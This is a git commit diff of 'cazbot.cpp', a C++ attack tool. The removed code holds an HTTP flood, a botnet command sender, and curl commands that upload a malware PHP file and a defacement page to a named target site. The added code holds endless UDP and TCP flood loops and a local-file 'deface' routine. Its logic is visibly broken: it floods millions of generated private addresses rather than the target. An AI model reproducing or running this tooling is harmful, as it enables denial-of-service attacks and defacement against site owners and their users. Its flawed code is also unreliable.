dd05189f80dac772c2e4679a20ad770dc157b663
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-18 17:45:11 +0800

    Update cazbot.cpp

--- cazbot.cpp
+++ cazbot.cpp
@@ -1,157 +1,116 @@
 #include <iostream>
-#include <string>
-#include <vector>
-#include <ctime>
-#include <cstdlib>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 #include <fstream>
+#include <vector>
+#include <cstdlib>
+#include <ctime>
+#include <thread>
+#include <chrono>
+#include <cstring>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
 
-#define MAX_CONNECTIONS 5000
-#define MAX_THREADS 100
-#define TARGET_PORT 80
-#define MALWARE_FILE_NAME "cazzy.php"
-#define HTML_FILE_NAME "cazzy.html"
+#define PACKET_SIZE 4096
+#define MAX_BOTNETS 100000000
 
-struct Bot {
-    std::string ip;
-    int port;
-};
+using namespace std;
 
-std::vector<Bot> bots;
+vector<string> botnetIPs;
+int targetPort;
+string targetWebsite;
+string defaceHTML;
+string malwarePHP;
 
-void infectServer(const std::string& target) {
-    std::ifstream malwareFile("cazzy.php");
-    std::string malwareCode((std::istreambuf_iterator<char>(malwareFile)),
-                             std::istreambuf_iterator<char>());
+void udpFlood(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
 
-    std::string command = "echo '" + malwareCode + "' > " + MALWARE_FILE_NAME;
-    command += " && curl -X POST -F 'file=@" + std::string(MALWARE_FILE_NAME) + "' " + target;
-
-    system(command.c_str());
-}
-
-void defaceWebsite(const std::string& target) {
-    std::ifstream htmlFile("cazzy.html");
-    std::string htmlContent((std::istreambuf_iterator<char>(htmlFile)),
-                             std::istreambuf_iterator<char>());
-
-    std::string command = "echo '" + htmlContent + "' > " + HTML_FILE_NAME;
-    command += " && curl -X POST -F 'file=@" + std::string(HTML_FILE_NAME) + "' " + target;
-
-    system(command.c_str());
-}
-
-void attackServer(const std::string& target) {
-    int sock;
-
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        return;
-    }
-
-    struct sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(TARGET_PORT);
-    serverAddr.sin_addr.s_addr = inet_addr(target.c_str());
-
-    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
-        close(sock);
-        return;
-    }
+    char packet[PACKET_SIZE];
+    memset(packet, 'A', sizeof(packet));
 
     while (true) {
-        std::string requestData = "GET / HTTP/1.1\r\nHost: " + target + "\r\n";
-        for (int i = 0; i < MAX_CONNECTIONS; ++i) {
-            send(sock, requestData.c_str(), requestData.size(), 0);
-        }
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
     }
-
-    close(sock);
 }
 
-void spawnBotThreads(const std::string& target) {
-    for (int i = 0; i < MAX_THREADS; ++i) {
-        if (fork() == 0) {
-            srand(time(NULL) ^ getpid());
-            while (true) {
-                attackServer(target);
-                sleep(rand() % 10 + 1);
-            }
-            exit(0);
+void tcpFlood(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    while (true) {
+        if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
+            close(sockfd);
+            sockfd = socket(AF_INET, SOCK_STREAM, 0);
         }
     }
 }
 
-void buildBotnet() {
-    std::string baseIP = "192.168.1.";
-    int startingIP = 101; // Starting IP address
-    int startingPort = 5555; // Starting port number
+void generateIPs() {
+    srand(time(nullptr));
 
-    for (int i = 0; i < 10000; ++i) { // Adjust the number of iterations here
-        Bot bot;
-        bot.ip = baseIP + std::to_string(startingIP++);
-        bot.port = startingPort++;
-        bots.push_back(bot);
+    string baseIP = "192.168.1.";
+    int basePort = 5555;
+
+    for (int i = 0; i < MAX_BOTNETS; i++) {
+        int lastOctet = rand() % 254 + 1;
+        string ip = baseIP + to_string(lastOctet);
+        botnetIPs.push_back(ip);
     }
 }
 
-
-void executeCommand(const std::string& command, const std::string& target) {
-    if (command == "start") {
-        spawnBotThreads(target);
+void startAttack() {
+    for (const auto& ip : botnetIPs) {
+        thread(udpFlood, ip, targetPort).detach();
+        thread(tcpFlood, ip, targetPort).detach();
     }
-    else if (command == "deface") {
-        infectServer(target);
-    }
-    else if (command == "buildbotnet") {
-        buildBotnet();
-    }
-    else if (command == "attackserver") {
-        attackServer(target);
-    }
-    else if (command == "defacewebsite") {
-        defaceWebsite(target);
-    }
-    else {
-        for (const auto& bot : bots) {
-            int sock;
+}
 
-            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-                return;
-            }
+void defaceWebsite() {
+    ofstream outFile(targetWebsite);
+    outFile << defaceHTML;
+    outFile.close();
 
-            struct sockaddr_in botAddr;
-            botAddr.sin_family = AF_INET;
-            botAddr.sin_port = htons(bot.port);
-            botAddr.sin_addr.s_addr = inet_addr(bot.ip.c_str());
-
-            if (connect(sock, (struct sockaddr*)&botAddr, sizeof(botAddr)) < 0) {
-                close(sock);
-                return;
-            }
-
-            send(sock, command.c_str(), command.size(), 0);
-
-            close(sock);
-        }
-    }
+    ofstream malwareFile(targetWebsite + ".php");
+    malwareFile << malwarePHP;
+    malwareFile.close();
 }
 
 int main() {
-    std::string target = "https://kantotin.com/";
+    cout << "Enter the target website URL: ";
+    cin >> targetWebsite;
 
-    buildBotnet();
-    infectServer(target);
+    cout << "Enter the target port: ";
+    cin >> targetPort;
 
-    while (true) {
-        std::string command;
-        std::cout << "Enter a command to execute on the botnet: ";
-        std::getline(std::cin, command);
+    cout << "Enter the path to the HTML file for defacing: ";
+    cin.ignore();
+    getline(cin, defaceHTML);
 
-        executeCommand(command, target);
-    }
+    cout << "Enter the path to the PHP file for the malware: ";
+    getline(cin, malwarePHP);
+
+    generateIPs();
+
+    cout << "Botnet IPs generated: " << botnetIPs.size() << endl;
+
+    cout << "Starting the DDoS attack..." << endl;
+    startAttack();
+
+    cout << "Attack started! To stop the attack, press Ctrl + C." << endl;
+
+    // Wait for the user to stop the attack
+
+    cout << "Defacing the target website..." << endl;
+    defaceWebsite();
+
+    cout << "Website defaced successfully!" << endl;
 
     return 0;
 }
